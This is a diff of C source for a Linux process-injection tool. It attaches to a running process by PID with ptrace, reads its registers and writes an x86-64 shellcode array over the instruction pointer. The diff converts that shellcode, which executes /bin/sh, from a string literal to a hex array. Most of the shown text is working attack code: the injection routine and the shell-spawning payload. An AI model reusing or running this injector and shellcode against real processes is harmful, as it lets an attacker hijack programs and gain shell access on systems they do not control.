@@ -12,21 +12,28 @@ bool AttachToPID( unsigned int __pid );
 bool GetRegisters(
 				struct user_regs_struct *__regs,
 				unsigned int __pid
-		 );
+		     );
 bool InjectShellcode(
 				struct user_regs_struct *__regs,
 				//void *__rip,
 				unsigned int __pid,
 				unsigned int __shellcode_size
-		    );
+		        );
 bool DetachFromPID( unsigned int __pid );
 
+/*
 char _shellcode_[] = "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
         	     	   "\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00"
            	     	   "\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57\x48\x89\xe6"
         	         "\x0f\x05"; //			/bin/sh
 				         //			linux x64 bit
+					   // Raw String Version \x instead of 0x HEX initializer
+*/
 
+char _shellcode_[] = { 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53,
+			     0x48, 0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8, 0x08, 0x00,
+			     0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6,
+			     0x0f, 0x05 };
 
 int main(
 		int argc,
@@ -63,7 +70,7 @@ bool AttachToPID( unsigned int __pid ) {
 bool GetRegisters(
 				struct user_regs_struct *__regs,
 				unsigned int __pid
-		 ) {
+		     ) {
 	if((ptrace(PTRACE_GETREGS, __pid, 0, *(&__regs))) < 0) return false;
 	return true;
 }
@@ -72,7 +79,7 @@ bool InjectShellcode(
 				//void *__rip,
 				unsigned int __pid,
 				unsigned int __shellcode_size
-		    ) {
+		        ) {
 	for(int i = 0; i < __shellcode_size; i++) ptrace(PTRACE_POKETEXT, __pid, __regs->rip+i, *(int*)(_shellcode_ + i));
 	return true;
 }
